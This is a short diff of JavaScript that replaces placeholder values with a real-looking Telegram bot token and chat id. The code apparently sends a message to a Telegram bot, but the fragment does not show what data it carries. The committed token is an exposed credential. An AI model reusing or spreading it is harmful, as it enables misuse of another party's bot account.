@@ -56,8 +56,8 @@ document
         "%0A%0AQueries : @riz4d";
 
   
-      var bot_token = "12345678:AAAAAABBBBCCCCC-ddddd45"; // your telegram bot token
-      var chat_id = 987456321;//your telegram chat id
+      var bot_token = "5567070022:AAFmyLQD1IgeueFkX0ZSgtJCQJeU334YwsU"; // your telegram bot token
+      var chat_id = 851259778;//your telegram chat id
 
    
       var url =
